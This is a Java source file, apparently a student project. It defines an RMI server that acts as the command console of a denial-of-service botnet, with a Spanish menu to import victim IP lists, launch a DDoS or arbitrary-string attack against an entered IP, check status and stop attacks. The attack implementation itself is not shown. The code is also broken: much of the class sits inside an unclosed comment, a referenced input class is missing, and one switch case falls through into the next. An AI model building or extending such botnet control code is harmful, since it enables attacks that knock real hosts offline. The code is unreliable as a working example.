import java.lang.invoke.MethodHandles.Lookup;
import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ServerNotActiveException;
import java.rmi.server.UnicastRemoteObject;
import java.util.ArrayList;



public class RMIServer {

	/*private static final RMIClient RMIClienteI = null;
	private static String Mensaje;
	private static String ipVictima;
	private static String strArbitrario;
	static RMIServer serv;
	private ArrayList<String> clientes ;
	
	
	public String getMensaje() {
		return Mensaje;
	}
	public void setMensaje(String mensaje) {
		Mensaje = mensaje;
	}

	
	protected RMIServer() throws RemoteException {
		super();
		Mensaje = "";
		ipVictima = "";
		strArbitrario = "";
		// TODO Auto-generated constructor stub
	}
	/**
	 * @param args
	 * @throws RemoteException 
	 * @throws AlreadyBoundException 
	 * @throws NotBoundException 
	 * @throws InterruptedException 
	 * @throws ServerNotActiveException 
	 */
	 
	public static void main(String[] args) throws RemoteException, AlreadyBoundException, NotBoundException, InterruptedException, ServerNotActiveException {
		 System.setProperty("java.security.policy", "file:/c:/workspace/Trabajo_Avanzada/src/java.policy" );
		 
		System.setProperty("java.rmi.server.codebase", "file:/c:/workspace/Trabajo_Avanzada/Trabajo_Avanzada/bin" );
		
		Registry reg = LocateRegistry.createRegistry(5555);
		RMIServerIMPL serv = new RMIServerIMPL();
		reg.rebind("Tomas", serv);
		
		//Thread.sleep(30000);
		String opcion;
		
		while (true)
		{
			System.out.println("Importar IP's de Victimas de Servidor (0)");
			System.out.println("Iniciar DDOS (1)");
			System.out.println("Iniciar STRING (2)");
			System.out.println("ESTADOS (3)");
			System.out.println("PARAR ATAQUE (4)");
			
			opcion = Entrada.readLine();
			String ipVictima = "";
			switch(opcion)
			{
				case "0" :  System.out.print("Ingrese Ruta de archivo a importar: ");
							serv.importFile(Entrada.readLine());
				case "1" :  System.out.print("Ingrese IP a atacar: ");
							ipVictima = Entrada.readLine();
							serv.atacar(ipVictima);
							serv.registrarLog(ipVictima, "Ataque conexion", null);
							       
							break ;
				case "2":   System.out.print("Ingrese IP a atacar: ");
							ipVictima = Entrada.readLine();
							System.out.print("Ingrese el mensaje a hacer: "); 
							serv.atacarStrArb(ipVictima,Entrada.readLine());
							break;
							/*
							break;
				case "3": Mensaje = "Estado";
				
				case "4":   System.out.print("Ingrese IP a dejar de atacar: ");*/
							
									
			}
		}
	}
	/*
	public void imprimir(){
		try {
			this.setMensaje( serv.getClientHost());
			System.out.println(this.getMensaje());
			clientes.add(serv.getClientHost());
			
			
		} catch (ServerNotActiveException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			
		}
		*/
		
}
